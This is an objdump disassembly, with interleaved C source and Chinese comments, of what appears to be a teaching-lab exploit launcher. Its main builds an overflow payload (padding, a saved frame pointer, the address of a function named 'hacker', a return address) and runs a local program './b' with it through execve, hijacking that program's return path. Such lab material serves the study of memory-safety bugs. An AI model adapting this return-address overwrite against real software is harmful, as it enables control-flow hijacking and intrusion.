
a-2:     file format elf32-i386


Disassembly of section .init:

08049000 <_init>:
 8049000:	53                   	push   %ebx
 8049001:	83 ec 08             	sub    $0x8,%esp
 8049004:	e8 87 00 00 00       	call   8049090 <__x86.get_pc_thunk.bx>
 8049009:	81 c3 eb 2f 00 00    	add    $0x2feb,%ebx
 804900f:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 8049015:	85 c0                	test   %eax,%eax
 8049017:	74 02                	je     804901b <_init+0x1b>
 8049019:	ff d0                	call   *%eax
 804901b:	83 c4 08             	add    $0x8,%esp
 804901e:	5b                   	pop    %ebx
 804901f:	c3                   	ret

Disassembly of section .plt:

08049020 <__libc_start_main@plt-0x10>:
 8049020:	ff 35 f8 bf 04 08    	push   0x804bff8
 8049026:	ff 25 fc bf 04 08    	jmp    *0x804bffc
 804902c:	00 00                	add    %al,(%eax)
	...

08049030 <__libc_start_main@plt>:
 8049030:	ff 25 00 c0 04 08    	jmp    *0x804c000
 8049036:	68 00 00 00 00       	push   $0x0
 804903b:	e9 e0 ff ff ff       	jmp    8049020 <_init+0x20>

08049040 <execve@plt>:
 8049040:	ff 25 04 c0 04 08    	jmp    *0x804c004
 8049046:	68 08 00 00 00       	push   $0x8
 804904b:	e9 d0 ff ff ff       	jmp    8049020 <_init+0x20>

Disassembly of section .text:

08049050 <_start>:
 8049050:	31 ed                	xor    %ebp,%ebp
 8049052:	5e                   	pop    %esi
 8049053:	89 e1                	mov    %esp,%ecx
 8049055:	83 e4 f0             	and    $0xfffffff0,%esp
 8049058:	50                   	push   %eax
 8049059:	54                   	push   %esp
 804905a:	52                   	push   %edx
 804905b:	e8 19 00 00 00       	call   8049079 <_start+0x29>
 8049060:	81 c3 94 2f 00 00    	add    $0x2f94,%ebx
 8049066:	6a 00                	push   $0x0
 8049068:	6a 00                	push   $0x0
 804906a:	51                   	push   %ecx
 804906b:	56                   	push   %esi
 804906c:	c7 c0 52 91 04 08    	mov    $0x8049152,%eax
 8049072:	50                   	push   %eax
 8049073:	e8 b8 ff ff ff       	call   8049030 <__libc_start_main@plt>
 8049078:	f4                   	hlt
 8049079:	8b 1c 24             	mov    (%esp),%ebx
 804907c:	c3                   	ret
 804907d:	66 90                	xchg   %ax,%ax
 804907f:	90                   	nop

08049080 <_dl_relocate_static_pie>:
 8049080:	c3                   	ret
 8049081:	66 90                	xchg   %ax,%ax
 8049083:	66 90                	xchg   %ax,%ax
 8049085:	66 90                	xchg   %ax,%ax
 8049087:	66 90                	xchg   %ax,%ax
 8049089:	66 90                	xchg   %ax,%ax
 804908b:	66 90                	xchg   %ax,%ax
 804908d:	66 90                	xchg   %ax,%ax
 804908f:	90                   	nop

08049090 <__x86.get_pc_thunk.bx>:
 8049090:	8b 1c 24             	mov    (%esp),%ebx
 8049093:	c3                   	ret
 8049094:	66 90                	xchg   %ax,%ax
 8049096:	66 90                	xchg   %ax,%ax
 8049098:	66 90                	xchg   %ax,%ax
 804909a:	66 90                	xchg   %ax,%ax
 804909c:	66 90                	xchg   %ax,%ax
 804909e:	66 90                	xchg   %ax,%ax

080490a0 <deregister_tm_clones>:
 80490a0:	b8 68 c0 04 08       	mov    $0x804c068,%eax
 80490a5:	3d 68 c0 04 08       	cmp    $0x804c068,%eax
 80490aa:	74 24                	je     80490d0 <deregister_tm_clones+0x30>
 80490ac:	b8 00 00 00 00       	mov    $0x0,%eax
 80490b1:	85 c0                	test   %eax,%eax
 80490b3:	74 1b                	je     80490d0 <deregister_tm_clones+0x30>
 80490b5:	55                   	push   %ebp
 80490b6:	89 e5                	mov    %esp,%ebp
 80490b8:	83 ec 14             	sub    $0x14,%esp
 80490bb:	68 68 c0 04 08       	push   $0x804c068
 80490c0:	ff d0                	call   *%eax
 80490c2:	83 c4 10             	add    $0x10,%esp
 80490c5:	c9                   	leave
 80490c6:	c3                   	ret
 80490c7:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 80490ce:	66 90                	xchg   %ax,%ax
 80490d0:	c3                   	ret
 80490d1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 80490d8:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 80490df:	90                   	nop

080490e0 <register_tm_clones>:
 80490e0:	b8 68 c0 04 08       	mov    $0x804c068,%eax
 80490e5:	2d 68 c0 04 08       	sub    $0x804c068,%eax
 80490ea:	89 c2                	mov    %eax,%edx
 80490ec:	c1 e8 1f             	shr    $0x1f,%eax
 80490ef:	c1 fa 02             	sar    $0x2,%edx
 80490f2:	01 d0                	add    %edx,%eax
 80490f4:	d1 f8                	sar    %eax
 80490f6:	74 20                	je     8049118 <register_tm_clones+0x38>
 80490f8:	ba 00 00 00 00       	mov    $0x0,%edx
 80490fd:	85 d2                	test   %edx,%edx
 80490ff:	74 17                	je     8049118 <register_tm_clones+0x38>
 8049101:	55                   	push   %ebp
 8049102:	89 e5                	mov    %esp,%ebp
 8049104:	83 ec 10             	sub    $0x10,%esp
 8049107:	50                   	push   %eax
 8049108:	68 68 c0 04 08       	push   $0x804c068
 804910d:	ff d2                	call   *%edx
 804910f:	83 c4 10             	add    $0x10,%esp
 8049112:	c9                   	leave
 8049113:	c3                   	ret
 8049114:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
 8049118:	c3                   	ret
 8049119:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi

08049120 <__do_global_dtors_aux>:
 8049120:	80 3d 65 c0 04 08 00 	cmpb   $0x0,0x804c065
 8049127:	75 17                	jne    8049140 <__do_global_dtors_aux+0x20>
 8049129:	55                   	push   %ebp
 804912a:	89 e5                	mov    %esp,%ebp
 804912c:	83 ec 08             	sub    $0x8,%esp
 804912f:	e8 6c ff ff ff       	call   80490a0 <deregister_tm_clones>
 8049134:	c6 05 65 c0 04 08 01 	movb   $0x1,0x804c065
 804913b:	c9                   	leave
 804913c:	c3                   	ret
 804913d:	8d 76 00             	lea    0x0(%esi),%esi
 8049140:	c3                   	ret
 8049141:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 8049148:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 804914f:	90                   	nop

08049150 <frame_dummy>:
 8049150:	eb 8e                	jmp    80490e0 <register_tm_clones>

08049152 <main>:
"abcdabcd"          // buffer与ebp旧值之间需要填充的内容
"\x28\xfe\xff\xbf"  // b的main的ebp值
"\x8c\x91\x04\x08"  // hacker的首地址
"\xc9\x91\x04\x08"; // outputs的返回地址

int main(int argc, char **argv) {
 8049152:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 8049156:	83 e4 f0             	and    $0xfffffff0,%esp
 8049159:	ff 71 fc             	push   -0x4(%ecx)
 804915c:	55                   	push   %ebp
 804915d:	89 e5                	mov    %esp,%ebp
 804915f:	51                   	push   %ecx
 8049160:	83 ec 14             	sub    $0x14,%esp
    char *arg[3];
    arg[0] = "./b";
 8049163:	c7 45 ec 08 a0 04 08 	movl   $0x804a008,-0x14(%ebp)
    arg[1] = code;
 804916a:	c7 45 f0 40 c0 04 08 	movl   $0x804c040,-0x10(%ebp)
    arg[2] = NULL;
 8049171:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
    execve(arg[0], arg, NULL);
 8049178:	8b 45 ec             	mov    -0x14(%ebp),%eax
 804917b:	83 ec 04             	sub    $0x4,%esp
 804917e:	6a 00                	push   $0x0
 8049180:	8d 55 ec             	lea    -0x14(%ebp),%edx
 8049183:	52                   	push   %edx
 8049184:	50                   	push   %eax
 8049185:	e8 b6 fe ff ff       	call   8049040 <execve@plt>
 804918a:	83 c4 10             	add    $0x10,%esp
    return 0;
 804918d:	b8 00 00 00 00       	mov    $0x0,%eax
}
 8049192:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 8049195:	c9                   	leave
 8049196:	8d 61 fc             	lea    -0x4(%ecx),%esp
 8049199:	c3                   	ret

Disassembly of section .fini:

0804919c <_fini>:
 804919c:	53                   	push   %ebx
 804919d:	83 ec 08             	sub    $0x8,%esp
 80491a0:	e8 eb fe ff ff       	call   8049090 <__x86.get_pc_thunk.bx>
 80491a5:	81 c3 4f 2e 00 00    	add    $0x2e4f,%ebx
 80491ab:	83 c4 08             	add    $0x8,%esp
 80491ae:	5b                   	pop    %ebx
 80491af:	c3                   	ret
